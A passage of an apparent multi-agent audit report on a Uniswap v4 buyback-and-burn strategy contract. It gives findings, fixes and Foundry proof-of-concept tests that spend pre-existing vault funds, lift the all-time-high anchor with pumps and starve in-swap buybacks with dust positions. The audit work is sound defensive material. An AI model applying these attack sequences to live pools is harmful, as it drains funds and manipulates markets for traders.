# Audit report

> Target: src/DrawdownBurnStrategy.sol (others are deployed context). Focus: (1) pot/pendingWall/accounted vs the vault's real ARB, pre-existing vault balance must never be spent; (2) v4 flash accounting in every unlockCallback path and onFeeReceived running inside another user's swap; (3) manipulation of the anchor, hourly-close ATH, tiers and buyback limits; (4) wall tick math, single-sided add/remove, crossed-wall burn, DoS of buildWall; (5) gas inside swaps vs the 400k cap.

| | |
|---|---|
| Repository | https://github.com/ch3rryhq/drawdown-burn-audit.git |
| Commit | `f55319f8e635922358167c3ce4c78d66e040ece9` |
| Job | `161d570f-16e8-48f6-b5b8-d3d5bc7e2936` |
| Judged | 2026-10-15 22:57 UTC |
| Findings | 1 high · 2 medium · 4 low · 1 info |

Four agents audited the code as it is at `f55319f`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. High: Constructor baselines `accounted` on an unsynced vault: reserve already in the vault but not yet credited by sync() is split and spent as a fee

`src/DrawdownBurnStrategy.sol:222`

```
        accounted = vault_.totalReceived(reserve_);
```

The README's invariant is that ARB already banked in the vault is never spent. `accounted` is frozen at `vault.totalReceived(reserve)` in the constructor, but FeeVault only credits totalReceived when sync() runs: reserve that reached the vault by plain transfer (bonding-curve fees, anything not routed through the hook's take+sync) sits as `vault.pending(reserve)` and is outside the snapshot. The next sync, which is permissionless and also runs inside every vault.withdraw (so inside every _payFromVault) and every _toVault, folds it into totalReceived; `_observe` then reads `total - accounted` as a fresh fee, splits it by the block's tier into pot/pendingWall, and the next in-swap buyback or buildWall spends it from the vault. Nothing forces a sync before the strategy is deployed, and anyone can trigger the sync afterwards. Merged from audit_flow, audit_math, audit_permissions and audit_economics (all reproduced). Fix: in the constructor use `accounted = vault_.totalReceived(reserve_) + vault_.pending(reserve_)` (verified: the attached proof passes with that one-line change), or call `vault_.sync(reserve_)` before reading totalReceived.

**Reproduction**

State: vault.totalReceived[ARB] == lastBalance[ARB] == 0 and 1000 ARB transferred straight to the vault (vault.pending(ARB) == 1000e18). Deploy DrawdownBurnStrategy (accounted == 0), set it as the vault's strategy and owner. Anyone calls vault.sync(ARB), then vault.onFeeReceived(ARB): Split is emitted and pot()+pendingWall() == 1000e18 (tier 0% at the ATH puts it all in pendingWall). Call buildWall(): the vault's ARB balance goes from 1000e18 to 0. Expected: pot()+pendingWall() == 0 and the 1000 ARB stays in the vault. Actual: the whole pre-existing balance is laid as the wall (or, with a tier above 0%, bought back inside the next swap). Reproduced with test/scratch/Proof_71eb1b9b646e.t.sol (fails: 'pre-existing vault balance was spent: 0 != 1000000000000000000000') and independently with the audit_flow proof (vault balance 100e18 -> 0 via buyback()).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
import {Token} from "src/Token.sol";
import {FeeVault} from "src/FeeVault.sol";
import {FeeHook} from "src/FeeHook.sol";
import {DrawdownBurnStrategy} from "src/DrawdownBurnStrategy.sol";

contract MockARB is ERC20 {
    constructor() ERC20("Arbitrum", "ARB") {
        _mint(msg.sender, 1e30);
    }
}

/// @dev Finding: the constructor snapshots `vault.totalReceived(reserve)` without syncing the vault
///      first, so reserve already sitting in the vault but not yet credited (balance > lastBalance)
///      is counted as a fresh fee by the first `_observe` and then spent. The README states the
///      pre-existing vault balance must never be spent.
contract BankSpentTest is Test {
    address constant TOKEN_ADDR = address(0x1000);
    // bits 6 (afterSwap) and 2 (afterSwapReturnDelta) set, nothing else in the low 14 bits
    address constant HOOK_ADDR = address(uint160((uint160(0xC0FFEE) << 14) | 0x44));
    int24 constant START_TICK = -69060; // ~0.001 ARB per token

    PoolManager pm;
    MockARB arb;
    Token token;
    FeeVault vault;
    PoolSwapTest swapRouter;
    PoolModifyLiquidityTest lpRouter;
    PoolKey key;
    DrawdownBurnStrategy strat;

    function setUp() public {
        pm = new PoolManager(address(this));
        arb = new MockARB();
        require(TOKEN_ADDR < address(arb), "ordering");
        deployCodeTo("Token.sol:Token", abi.encode("Token", "TKN", uint256(1e27), address(this)), TOKEN_ADDR);
        token = Token(TOKEN_ADDR);
        vault = new FeeVault(address(this));
        deployCodeTo(
            "FeeHook.sol:FeeHook", abi.encode(pm, address(vault), address(arb), uint256(330), address(this)), HOOK_ADDR
        );
        key = PoolKey(Currency.wrap(TOKEN_ADDR), Currency.wrap(address(arb)), 3000, 60, IHooks(HOOK_ADDR));
        pm.initialize(key, TickMath.getSqrtPriceAtTick(START_TICK));

        swapRouter = new PoolSwapTest(pm);
        lpRouter = new PoolModifyLiquidityTest(pm);
        token.approve(address(swapRouter), type(uint256).max);
        token.approve(address(lpRouter), type(uint256).max);
        arb.approve(address(swapRouter), type(uint256).max);
        arb.approve(address(lpRouter), type(uint256).max);
        lpRouter.modifyLiquidity(key, ModifyLiquidityParams(-138120, 0, 1e21, 0), "");
    }

    function test_uncreditedBankIsSpent() public {
        // The bank: 1000 ARB that reached the vault by plain transfer and was never synced.
        // (FeeVault.sync is permissionless, nothing forces it to have run before deployment.)
        arb.transfer(address(vault), 1000e18);
        assertEq(vault.totalReceived(address(arb)), 0);
        assertEq(vault.pending(address(arb)), 1000e18);

        address[] memory excluded;
        strat = new DrawdownBurnStrategy(pm, vault, key, token, address(arb), 0, excluded, 1e21, 600, address(this));
        vault.setStrategy(strat);
        vault.transferOwnership(address(strat));

        // Any later sync credits the bank as if it were a new fee; the next notification splits it.
        vault.sync(address(arb));
        vault.onFeeReceived(address(arb));

        // At the ATH the tier is 0%, so the whole "fee" is queued for the wall and laid by anyone.
        strat.buildWall();

        // Expected: the pre-existing 1000 ARB stays in the vault. Actual: it is spent on the wall.
        assertEq(arb.balanceOf(address(vault)), 1000e18, "pre-existing vault balance was spent");
    }
}
```

### 2. Medium: Hourly-close ATH is taken from a mid-transaction reading, and anchoring costs no trade: a wick or a held pump plus gas-only readings lifts athMcap, which can never be lowered

`src/DrawdownBurnStrategy.sol:382`

```
        if (hour != a.hour && mcap > ath) ath = mcap;
```

The header promises that 'a wick inside an hour is never an ATH' and that holding a pump to an hour's close is 'paid for every block -- a round trip through the pool's fee each time'. Neither holds. (a) The hour's 'close' is lastMcap, written by the block's first reading, and that reading is taken inside the pump's own afterSwap (hook -> FeeVault.onFeeReceived -> _observe) at the post-swap tick, stepped at most MAX_ANCHOR_STEP from the last anchor. Every later call in the same block.number returns the pinned anchor, so dumping back in the same transaction never touches it; if that block is the last with a reading in the clock hour, the next hour's first reading promotes the wick. (b) A reading needs no trade: FeeVault.onFeeReceived(address) has no access control and the strategy only checks msg.sender == vault, and buyback()/buildWall() are permissionless, so after one pump an attacker advances the anchor by 200 ticks per block.number with a plain call (no fee) until it equals the held price; on Arbitrum One block.number is the L1 block (~12 s), so a 2x takes ~35 calls / 7 minutes. The permissionless vault entry also bypasses buyback()'s PoolLocked guard: a contract calling vault.onFeeReceived from its own unlockCallback runs the strategy's observe/burn/buyInside (sync, vault.withdraw, settle) inside its own unlock, between its own swaps (reproduced: the bought tokens appear in the strategy and totalSpent rises inside a foreign unlock). athMcap only rises (lines 398-401) and has no owner reset. Consequences: every later tier is read against the inflated ATH (100% of fees to the pot, nothing to the wall) and wallTarget() sits at 40% of the inflated ATH, which can be above the real price so buildWall() returns at `tick < upper` and pendingWall is never laid, or right at the market so the whole pendingWall is laid as a buy wall under the manipulator. Merged from audit_flow (036c), audit_math (3c98), audit_permissions (8895) and audit_economics (0dec, ed35). Fix (a design decision): take the hour's close from a reading confirmed in a later block (e.g. the minimum of the hour's last reading and the next hour's first reading, or require the candidate to persist across N block-separated readings), rate-limit anchor steps by elapsed blocks since the last large move rather than per call, consider having the vault pass msg.sender so the strategy only reads from the hook's afterSwap, and add an owner-only correction for athMcap. At minimum correct the NatSpec cost claim.

**Reproduction**

State: pool at tick 0, strategy anchored at tick 0 in block 100 (athMcap = m0 = 1e27 with 1e27 supply at price 1). Block 101, one transaction: buy token with 1e26 ARB until tick +1000 (the buy's afterSwap anchors the block at +200 while the end-of-block price is tick 0), then sell it all back to tick <= 0. Block 102 in the next clock hour: call buyback() (any reading). Expected per the documented rule: athMcap == m0. Actual: athMcap == 1.0201986e27 (+2.02%, NewHigh emitted); repeating each hour compounds. Reproduced with test/scratch/ProofAthWick.t.sol (fails: 'ATH lifted by an intra-transaction wick'). Free walk: after one pump of +2000 ticks, calling FeeVault.onFeeReceived(address(0)) from any EOA in each of the next 10 L1 blocks moves anchor.tick 200, 400, ... 2000 with no swap and no fee. Guard bypass: a Runner whose unlockCallback calls vault.onFeeReceived(ARB) makes the strategy buy inside the Runner's unlock (test/scratch/Judge.t.sol test_foreignUnlockRunsBuyback: totalSpent 0 -> 3.26e20 inside the foreign unlock).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";

import {DrawdownBurnStrategy} from "src/DrawdownBurnStrategy.sol";
import {FeeVault} from "src/FeeVault.sol";
import {FeeHook} from "src/FeeHook.sol";
import {Token} from "src/Token.sol";
import {IFeeStrategy} from "src/interfaces/IFeeStrategy.sol";

contract MockARB is ERC20 {
    constructor() ERC20("Arbitrum", "ARB") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev A local copy of the live wiring: real PoolManager, the FeeHook at a flag-mined address, the
///      token, the vault and the strategy. The test contract is its own router (unlock callback).
contract AthWickProof is Test, IUnlockCallback {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    PoolManager pm;
    Token token;
    MockARB arb;
    FeeVault vault;
    FeeHook hook;
    DrawdownBurnStrategy strat;
    PoolKey key;

    uint8 constant A_SWAP = 0;
    uint8 constant A_LIQ = 1;

    function setUp() public {
        vm.roll(100);
        vm.warp(1_700_000_000);
        pm = new PoolManager(address(this));
        token = new Token("T", "T", 1e27, address(this));
        arb = new MockARB();
        while (address(arb) < address(token)) arb = new MockARB();
        arb.mint(address(this), 1e30);
        vault = new FeeVault(address(this));

        address hookAddr = address(uint160((uint256(0x4444) << 144) | 0x44)); // afterSwap + afterSwapReturnDelta
        deployCodeTo("FeeHook.sol:FeeHook", abi.encode(pm, address(vault), address(arb), 330, address(this)), hookAddr);
        hook = FeeHook(hookAddr);

        key = PoolKey({
            currency0: Currency.wrap(address(token)),
            currency1: Currency.wrap(address(arb)),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(hookAddr)
        });
        pm.initialize(key, uint160(1 << 96)); // tick 0, price 1 ARB per token
        token.approve(address(pm), type(uint256).max);
        arb.approve(address(pm), type(uint256).max);
        // Full-range liquidity.
        liq(-887220, 887220, 1e24);

        address[] memory ex = new address[](0);
        strat = new DrawdownBurnStrategy(pm, vault, key, token, address(arb), 0, ex, 1e24, 600, address(this));
        vault.setStrategy(IFeeStrategy(address(strat)));
        vault.transferOwnership(address(strat));
        // A first reading in the deploy block, so the anchor step applies from here on.
        strat.buyback();
        (uint64 b, int24 at,,,) = strat.anchor();
        assertEq(b, 100);
        assertEq(at, 0);
    }

    // ------------------------------------------------------------------ router
    function swap(bool zeroForOne, int256 amount, int24 limitTick) public returns (BalanceDelta d) {
        bytes memory r = pm.unlock(abi.encode(A_SWAP, zeroForOne, amount, limitTick));
        d = abi.decode(r, (BalanceDelta));
    }

    function liq(int24 lower, int24 upper, int256 l) public {
        pm.unlock(abi.encode(A_LIQ, lower, upper, l));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm));
        uint8 a = abi.decode(data, (uint8));
        BalanceDelta d;
        if (a == A_SWAP) {
            (, bool z, int256 amt, int24 lim) = abi.decode(data, (uint8, bool, int256, int24));
            d = pm.swap(
                key, SwapParams({zeroForOne: z, amountSpecified: amt, sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(lim)}), ""
            );
        } else {
            (, int24 lo, int24 up, int256 l) = abi.decode(data, (uint8, int24, int24, int256));
            (d,) = pm.modifyLiquidity(key, ModifyLiquidityParams(lo, up, l, 0), "");
        }
        _settle(key.currency0, d.amount0());
        _settle(key.currency1, d.amount1());
        return abi.encode(d);
    }

    function _settle(Currency c, int128 amt) internal {
        if (amt < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(uint128(-amt)));
            pm.settle();
        } else if (amt > 0) {
            pm.take(c, address(this), uint256(uint128(amt)));
        }
    }

    function tick() internal view returns (int24 t) {
        (, t,,) = IPoolManager(address(pm)).getSlot0(key.toId());
    }

    // ------------------------------------------------------------------ the test
    /// The docs: "a wick inside an hour is never an ATH". One transaction: pump +1000 ticks (the
    /// buy's afterSwap anchors the block at +200), dump back to the start. The hour closes at the
    /// starting price. The next hour's first reading must therefore leave athMcap unchanged.
    function test_wickInsideHourLiftsAth() public {
        uint256 ath0 = strat.athMcap();
        int24 t0 = tick();
        assertEq(t0, 0);

        vm.roll(101);
        vm.warp(block.timestamp + 10 minutes);
        // Pump: buy token with ARB until tick +1000, then dump back to tick 0, atomically.
        swap(false, -int256(1e26), 1000);
        assertGt(tick(), 900);
        swap(true, -int256(1e26), 0);
        assertLe(tick(), 0);
        // The anchor was pinned mid-pump at +200.
        (, int24 anchorTick,,,) = strat.anchor();
        assertEq(anchorTick, 200);

        // Next hour, first reading: the "close" taken is the wick.
        vm.roll(102);
        vm.warp((block.timestamp / 1 hours + 1) * 1 hours + 1);
        strat.buyback();

        assertEq(strat.athMcap(), ath0, "ATH lifted by an intra-transaction wick");
    }
}
```

### 3. Medium: Dust positions on spacing boundaries push the in-swap buyback past the vault's 400k cap: buyInside runs out of gas on every swap, silently and persistently

`src/DrawdownBurnStrategy.sol:257`

```
            try this.buyInside(amount) {} catch {}
```

The buyback that runs inside a trader's swap is a nested poolManager.swap under FeeVault.STRATEGY_GAS_LIMIT (400k). The nested swap pays for every initialized tick it crosses between the current tick and min(tick, anchor)+200; crossing a tick for the first time from below writes both feeGrowthOutside slots from zero plus cold reads, roughly 27k-53k per tick (here: +82k for three ticks on top of a 307k baseline with 8 excluded addresses). Anyone can initialize every tickSpacing boundary around the price with liquidityDelta 1000 (41 positions over +-1200 ticks, one transaction, never re-funded). The in-swap call then exhausts its gas inside buyInside; the strategy's own try/catch swallows the OutOfGas, so the vault does not even emit StrategyCallFailed, the fee is still split and the pot keeps growing, and because the failed nested swap reverts, the planted ticks are never crossed and stay fresh, so every later swap fails the same way until someone pays for buyback() on their own gas. With the README's measured 327k peak on the live pool, two planted ticks inside the window are enough. Impact: the on-trade automation the design relies on is lost, buybacks degrade to a keeper-only process, every trader still pays the full ~390k of gas for nothing, and the idle pot is predictable. Merged from audit_flow (f2cd), audit_math (06ff), audit_permissions (54b7) and audit_economics (2478). Fix preserving the design: inside a swap bound the nested swap's price limit so it crosses at most one initialized tick (e.g. the next spacing boundary above the current tick, found with the tick bitmap) and leave the rest to buyback(); the attached proof passes with a fix that keeps buying in-swap, and fails with one that merely skips the buy.

**Reproduction**

Harness: real PoolManager, FeeHook at a flag address (fee 330 bps), tickSpacing 60, lpFee 3000, 8 excluded addresses, full-range liquidity 1e23, price near tick 0, maxPerBuy 1e24, ATH far above the market so the whole fee goes to the pot. Block 101: build a pot of ~1.47e21 ARB with one 8e22-token sell (1 wei of token sent to the strategy first so that call only burns). Control, block 102: a 1e20-token sell -> strategy.onFeeReceived uses 307,728 gas, buyInside 214k, BoughtBack 5.6e20 ARB. Attack instead: block 102 mint modifyLiquidity(t, t+60, 1000) for every t = floor60(tick)-1200 .. +1200; block 103 the same 1e20-token sell. Expected: BoughtBack as in the control. Actual: strategy.onFeeReceived uses 389,407 gas, buyInside 295,901 and runs out of gas, no BoughtBack, totalSpent() == 0 while pot() grew; block 104 the same sell fails identically (389,407 gas); block 105 buyback() on a keeper's gas buys 5.6e20. Reproduced with test/scratch/ProofTickGas.t.sol (test_plantedTicksStarveInSwapBuyback fails: 'in-swap buyback starved by planted ticks: 0 <= 0'; test_control_inSwapBuybackRuns passes).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, Vm} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";

import {DrawdownBurnStrategy} from "src/DrawdownBurnStrategy.sol";
import {FeeVault} from "src/FeeVault.sol";
import {FeeHook} from "src/FeeHook.sol";
import {Token} from "src/Token.sol";
import {IFeeStrategy} from "src/interfaces/IFeeStrategy.sol";

contract MockARB is ERC20 {
    constructor() ERC20("Arbitrum", "ARB") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Calls the vault's open notification from inside its own unlock.
contract RunnerUnused is IUnlockCallback {
    PoolManager immutable pm;
    FeeVault immutable vault;
    address immutable arb;

    constructor(PoolManager pm_, FeeVault vault_, address arb_) {
        pm = pm_;
        vault = vault_;
        arb = arb_;
    }

    function run() external {
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        vault.onFeeReceived(arb);
        return "";
    }
}

abstract contract Harness is Test, IUnlockCallback {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    PoolManager pm;
    Token token;
    MockARB arb;
    FeeVault vault;
    FeeHook hook;
    DrawdownBurnStrategy strat;
    PoolKey key;

    uint8 constant A_SWAP = 0;
    uint8 constant A_LIQ = 1;

    function athArg() internal pure virtual returns (uint256);

    function setUp() public {
        vm.roll(100);
        vm.warp(1_700_000_000);
        pm = new PoolManager(address(this));
        token = new Token("T", "T", 1e27, address(this));
        arb = new MockARB();
        while (address(arb) < address(token)) arb = new MockARB();
        arb.mint(address(this), 1e30);
        vault = new FeeVault(address(this));

        address hookAddr = address(uint160((uint256(0x4444) << 144) | 0x44)); // afterSwap + afterSwapReturnDelta
        deployCodeTo("FeeHook.sol:FeeHook", abi.encode(pm, address(vault), address(arb), 330, address(this)), hookAddr);
        hook = FeeHook(hookAddr);

        key = PoolKey({
            currency0: Currency.wrap(address(token)),
            currency1: Currency.wrap(address(arb)),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(hookAddr)
        });
        pm.initialize(key, uint160(1 << 96)); // tick 0
        token.approve(address(pm), type(uint256).max);
        arb.approve(address(pm), type(uint256).max);
        liq(-887220, 887220, 1e24);

        // Eight excluded addresses, the live maximum.
        address[] memory ex = new address[](8);
        for (uint256 i = 0; i < 8; i++) {
            ex[i] = address(uint160(0x1000 + i));
            token.transfer(ex[i], 1);
        }
        strat = new DrawdownBurnStrategy(pm, vault, key, token, address(arb), athArg(), ex, 1e24, 600, address(this));
        vault.setStrategy(IFeeStrategy(address(strat)));
        vault.transferOwnership(address(strat));
        strat.buyback(); // first reading in the deploy block
    }

    function swap(bool zeroForOne, int256 amount, int24 limitTick) public returns (BalanceDelta d) {
        bytes memory r = pm.unlock(abi.encode(A_SWAP, zeroForOne, amount, limitTick));
        d = abi.decode(r, (BalanceDelta));
    }

    function liq(int24 lower, int24 upper, int256 l) public {
        pm.unlock(abi.encode(A_LIQ, lower, upper, l));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm));
        uint8 a = abi.decode(data, (uint8));
        BalanceDelta d;
        if (a == A_SWAP) {
            (, bool z, int256 amt, int24 lim) = abi.decode(data, (uint8, bool, int256, int24));
            d = pm.swap(
                key, SwapParams({zeroForOne: z, amountSpecified: amt, sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(lim)}), ""
            );
        } else {
            (, int24 lo, int24 up, int256 l) = abi.decode(data, (uint8, int24, int24, int256));
            (d,) = pm.modifyLiquidity(key, ModifyLiquidityParams(lo, up, l, 0), "");
        }
        _settle(key.currency0, d.amount0());
        _settle(key.currency1, d.amount1());
        return abi.encode(d);
    }

    function _settle(Currency c, int128 amt) internal {
        if (amt < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(uint128(-amt)));
            pm.settle();
        } else if (amt > 0) {
            pm.take(c, address(this), uint256(uint128(amt)));
        }
    }

    function tick() internal view returns (int24 t) {
        (, t,,) = IPoolManager(address(pm)).getSlot0(key.toId());
    }

    function floor60(int24 t) internal pure returns (int24) {
        int24 q = t / 60;
        if (t < 0 && t % 60 != 0) q--;
        return q * 60;
    }

    function sawStrategyCallFailed(Vm.Log[] memory logs) internal pure returns (bool) {
        bytes32 sig = keccak256("StrategyCallFailed(address,address)");
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == sig) return true;
        }
        return false;
    }
}

/// @dev ATH far above the market: every fee goes to the pot, so a sell triggers an in-swap buyback.
contract TickGasProof is Harness {
    function athArg() internal pure override returns (uint256) {
        return 10e27;
    }

    /// A pot of ~1.5e21 ARB against 1e23 liquidity: one big sell, kept from buying by a wei of dust
    /// so its fee only lands in the pot.
    function _bigPot() internal {
        liq(-887220, 887220, -9e23); // 1e23 left
        vm.roll(101);
        token.transfer(address(strat), 1);
        swap(true, -int256(8e22), -887000);
        assertGt(strat.pot(), 1e21, "pot built");
        assertEq(strat.totalSpent(), 0);
    }

    /// Control: with no initialized tick on the buyback's path the in-swap buyback runs (307k gas here).
    function test_control_inSwapBuybackRuns() public {
        _bigPot();
        vm.roll(102);
        swap(true, -int256(1e20), -887000);
        assertGt(strat.totalSpent(), 0, "in-swap buyback ran");
    }

    /// 1000-wei positions on every spacing boundary around the price: the nested swap crosses three
    /// fresh ticks inside its 200-tick window, buyInside runs out of gas under the 400k cap, the
    /// catch swallows it and nothing is bought, on this swap and every later one.
    function test_plantedTicksStarveInSwapBuyback() public {
        _bigPot();
        vm.roll(102);
        int24 base = floor60(tick());
        for (int24 t = base - 1200; t <= base + 1200; t += 60) {
            liq(t, t + 60, 1000);
        }
        vm.roll(103);
        uint256 pot0 = strat.pot();
        swap(true, -int256(1e20), -887000);
        assertGt(strat.pot(), pot0, "fee was split into the pot");
        assertGt(strat.totalSpent(), 0, "in-swap buyback starved by planted ticks");
    }
}
```

### 4. Low: First reading after deployment bypasses the anchor step: block_ == 0 lets a same-transaction pump set the anchor, tier and hourly close at any tick

`src/DrawdownBurnStrategy.sol:416`

```
        if (a.block_ == 0) return tick;
```

The constructor writes a valid last anchor tick but leaves anchor.block_ at 0, and _stepped returns the raw pool tick whenever block_ == 0. The first reading after deployment, which anyone can trigger (a swap's afterSwap, buyback(), buildWall(), or the permissionless FeeVault.onFeeReceived), therefore ignores MAX_ANCHOR_STEP: a pump in the same transaction sets the anchor, lastMcap (the running hourly close) and the block's tier at an arbitrary tick instead of at most 200 ticks from the deploy-time tick, and if that is the hour's last reading it becomes the irreversible ATH. One-shot per deployment, but the strategy is deployed before it is installed and the first reading is whoever trades first. Distinct from the hourly-close finding: this is the unbounded single-transaction case with a one-line fix. Merged from audit_flow (4f25) and audit_math (f7ec). Fix: delete the `a.block_ == 0` early return (the constructor's tick is a real last anchor), or write block.number into anchor.block_ in the constructor; verified that removing the line makes the attached proof pass.

**Reproduction**

Deploy at tick -69060 (supply 1e27, L = 1e21) with athMcap_ = 0 so ath = mcap0 = 1.0e24. In a later block, one transaction: buy with 30 ARB (pool ends ~3.8x higher), whose afterSwap is the first reading and anchors the block unstepped; sell the tokens back. Warp one hour and call vault.onFeeReceived(ARB). Expected with stepping from the constructor's tick: athMcap <= mcap0 * 1.0202 (200 ticks). Actual: athMcap == 3.79e24 (3.8x). Reproduced with test/scratch/Proof_f7ec43a1920d.t.sol (fails: 'a single-tx wick became the ATH: 3790255889948495916343792 > 1022345239503356849507920'); the same in the audit_flow harness: anchor.tick == 1000 after a +1000 pump in the first-reading transaction.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
import {Token} from "src/Token.sol";
import {FeeVault} from "src/FeeVault.sol";
import {FeeHook} from "src/FeeHook.sol";
import {DrawdownBurnStrategy} from "src/DrawdownBurnStrategy.sol";

contract MockARB is ERC20 {
    constructor() ERC20("Arbitrum", "ARB") {
        _mint(msg.sender, 1e30);
    }
}

/// @dev Finding: `_stepped` returns the raw pool tick when `anchor.block_ == 0`, which is the state
///      the constructor leaves behind. The very first observation after deployment is therefore not
///      limited to MAX_ANCHOR_STEP from the deploy-time tick: a single-transaction pump sets the
///      anchor and `lastMcap` at the pumped price, and the next hour's first reading promotes that
///      wick to the ATH. The documented guarantee is that a wick inside an hour is never an ATH and
///      that the anchor moves at most ~2% per block.
contract UnsteppedFirstAnchorTest is Test {
    address constant TOKEN_ADDR = address(0x1000);
    address constant HOOK_ADDR = address(uint160((uint160(0xC0FFEE) << 14) | 0x44));
    int24 constant START_TICK = -69060;

    PoolManager pm;
    MockARB arb;
    Token token;
    FeeVault vault;
    PoolSwapTest swapRouter;
    PoolModifyLiquidityTest lpRouter;
    PoolKey key;
    DrawdownBurnStrategy strat;

    function setUp() public {
        pm = new PoolManager(address(this));
        arb = new MockARB();
        require(TOKEN_ADDR < address(arb), "ordering");
        deployCodeTo("Token.sol:Token", abi.encode("Token", "TKN", uint256(1e27), address(this)), TOKEN_ADDR);
        token = Token(TOKEN_ADDR);
        vault = new FeeVault(address(this));
        deployCodeTo(
            "FeeHook.sol:FeeHook", abi.encode(pm, address(vault), address(arb), uint256(330), address(this)), HOOK_ADDR
        );
        key = PoolKey(Currency.wrap(TOKEN_ADDR), Currency.wrap(address(arb)), 3000, 60, IHooks(HOOK_ADDR));
        pm.initialize(key, TickMath.getSqrtPriceAtTick(START_TICK));

        swapRouter = new PoolSwapTest(pm);
        lpRouter = new PoolModifyLiquidityTest(pm);
        token.approve(address(swapRouter), type(uint256).max);
        token.approve(address(lpRouter), type(uint256).max);
        arb.approve(address(swapRouter), type(uint256).max);
        arb.approve(address(lpRouter), type(uint256).max);
        lpRouter.modifyLiquidity(key, ModifyLiquidityParams(-138120, 0, 1e21, 0), "");

        vm.warp(1_000_000 * 3600); // a clean hour boundary, well away from zero
        vm.roll(100);
        address[] memory excluded;
        strat = new DrawdownBurnStrategy(pm, vault, key, token, address(arb), 0, excluded, 1e21, 600, address(this));
        vault.setStrategy(strat);
        vault.transferOwnership(address(strat));
    }

    function test_singleTxPumpBecomesAth() public {
        uint256 mcap0 = strat.marketCap();
        assertEq(strat.athMcap(), mcap0);

        // Same block as deployment, one transaction: pump ~3.8x (30 ARB in against L = 1e21), which
        // notifies the strategy from afterSwap and anchors the block at the pumped tick unstepped.
        uint256 before = token.balanceOf(address(this));
        swapRouter.swap(
            key,
            SwapParams(false, -int256(30e18), TickMath.MAX_SQRT_PRICE - 1),
            PoolSwapTest.TestSettings(false, false),
            ""
        );
